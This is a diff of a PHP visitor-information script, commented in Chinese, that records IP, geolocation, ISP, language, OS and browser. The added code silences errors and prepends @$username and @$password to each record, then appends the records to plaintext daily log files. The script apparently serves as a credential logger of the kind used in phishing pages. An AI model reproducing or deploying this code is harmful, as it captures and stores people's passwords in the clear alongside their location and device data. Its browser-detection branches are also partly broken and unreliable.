@@ -1,31 +1,54 @@
 <?php
+error_reporting(0);
 //网上找不到完全OK的功能，所以自己写了个新的，获取地址功能需要文件在服务器
 header("Content:Content-type:text/html;charset=utf-8");
+date_default_timezone_set("PRC");//设置时区
+
 //      // 作用取得客户端的ip、地理位置、浏览器、以及访问设备
      class get_equipment_info{ 
       ////获得访客浏览器类型
-      function GetBrowser(){
-       if(!empty($_SERVER['HTTP_USER_AGENT']))
-       {
-         $br = $_SERVER['HTTP_USER_AGENT'];
-          if (preg_match('/MSIE/i',$br)){    
-             $br = 'MSIE';
-          }
-          elseif (preg_match('/Firefox/i',$br)){
-             $br = 'Firefox';
-          }elseif (preg_match('/Chrome/i',$br)){
-             $br = 'Chrome';
-          }elseif (preg_match('/Safari/i',$br)){
-             $br = 'Safari';
-          }elseif (preg_match('/Opera/i',$br)){
-             $br = 'Opera';
-          }else {
-             $br = 'Other';
-          }
-             return json_encode("浏览器:".$br."|");
-          }else{
-             return "获取浏览器信息失败！";} 
-      }
+        function GetBrowser() {
+            $user_OSagent = $_SERVER['HTTP_USER_AGENT'];
+            if (strpos($user_OSagent, "Maxthon") && strpos($user_OSagent, "MSIE")) {
+                $visitor_browser = "Maxthon(Microsoft IE)";
+            } elseif (strpos($user_OSagent, "Maxthon 2.0")) {
+                $visitor_browser = "Maxthon 2.0";
+            } elseif (strpos($user_OSagent, "Maxthon")) {
+                $visitor_browser = "Maxthon";
+            } elseif (strpos($user_OSagent, "Edge")) {
+                $visitor_browser = "Edge";
+            } elseif (strpos($user_OSagent, "Trident")) {
+                $visitor_browser = "IE";
+            } elseif (strpos($user_OSagent, "MSIE")) {
+                $visitor_browser = "IE";
+            } elseif (strpos($user_OSagent, "MSIE")) {
+                $visitor_browser = "MSIE 较高版本";
+            } elseif (strpos($user_OSagent, "NetCaptor")) {
+                $visitor_browser = "NetCaptor";
+            } elseif (strpos($user_OSagent, "Netscape")) {
+                $visitor_browser = "Netscape";
+            } elseif (strpos($user_OSagent, "Chrome")) {
+                $visitor_browser = "Chrome";
+            } elseif (strpos($user_OSagent, "Lynx")) {
+                $visitor_browser = "Lynx";
+            } elseif (strpos($user_OSagent, "Opera")) {
+                $visitor_browser = "Opera";
+            } elseif (strpos($user_OSagent, "MicroMessenger")) {
+                $visitor_browser = "微信浏览器";
+            } elseif (strpos($user_OSagent, "Konqueror")) {
+                $visitor_browser = "Konqueror";
+            } elseif (strpos($user_OSagent, "Mozilla/5.0")) {
+                $visitor_browser = "Mozilla";
+            } elseif (strpos($user_OSagent, "Firefox")) {
+                $visitor_browser = "Firefox";
+            } elseif (strpos($user_OSagent, "U")) {
+                $visitor_browser = "Firefox";
+            } else {
+                $visitor_browser = "其它";
+            }
+            //return $visitor_browser;
+            return json_encode("浏览器:".$visitor_browser."|");
+        }
       ////获得访客浏览器语言
       function GetLang()
       {
@@ -39,7 +62,7 @@ header("Content:Content-type:text/html;charset=utf-8");
                 }else{
                    $lang = "English";
                 }
-                return json_encode("浏览器语言:".$lang."|"); 
+                return json_encode("语言:".$lang."|"); 
            }else{
             return "获取浏览器语言失败！";
             }
@@ -183,7 +206,6 @@ header("Content:Content-type:text/html;charset=utf-8");
         }  
      }  
 
-      //var_dump(Getip());
       $data=Getip();
       $info = new get_equipment_info();
       //echo json_decode($info -> GetLang());
@@ -191,7 +213,51 @@ header("Content:Content-type:text/html;charset=utf-8");
       //echo json_decode($info -> GetBrowser());
       //echo json_decode($info -> Getip());
       //集合输出
-      $message=$data['data']['ip']."|".$data['data']['region'].$data['data']['city'].$data['data']['isp']."|".json_decode($info -> GetLang()).json_decode($info -> GetOs()).json_decode($info -> GetBrowser());
-      echo $message;
+      $message=@$username."|".@$password."|".$data['data']['ip']."|".$data['data']['region'].$data['data']['city'].$data['data']['isp']."|".json_decode($info -> GetLang()).json_decode($info -> GetOs()).json_decode($info -> GetBrowser()).date("H:i:s");
+     
     //echo $message;//113.70.47.90|广东佛山电信|浏览器语言:简体中文|系统:Windows 7|浏览器为Chrome|
-      die;
+ 
+class Log {
+
+    private $maxsize = 1024000; //最大文件大小1M
+    
+    //写入日志
+    public function writeLog($filename,$msg){
+        //$res = array();
+        //$res['msg'] = $msg;
+        //$res['logtime'] = date("Y-m-d H:i:s",time());
+        
+        //如果日志文件超过了指定大小则备份日志文件
+        if(file_exists($filename) && (abs(filesize($filename)) > $this->maxsize)){
+            $newfilename = dirname($filename).'/'.time().'-'.basename($filename);
+            rename($filename, $newfilename);
+        }
+
+        //如果是新建的日志文件，去掉内容中的第一个字符逗号
+        if(file_exists($filename) && abs(filesize($filename))>0){
+            $content = "\n".$msg;
+        }else{
+            $content = $msg;
+        }
+
+        //往日志文件内容后面追加日志内容
+        file_put_contents($filename, $content, FILE_APPEND);
+    }   
+
+    //读取日志
+    public function readLog($filename){
+        if(file_exists($filename)){
+            $content = file_get_contents($filename);
+            $json = json_decode('['.$content.']',true);
+        }else{
+            $json = '{"msg":"The file does not exist."}';
+        }
+        return $json;
+    }//读日记调用方法//$loglist = $Log->readLog($filename);
+}
+//写到日记，调用方法，注意：请先创建logs文件夹
+        $filename = "logs/log_" . date("Ymd", time()) . ".txt";
+        $Log = new Log();
+        $Log->writeLog($filename, $message);
+        return $message;
+die;//如不需要log功能，删除log类220-261
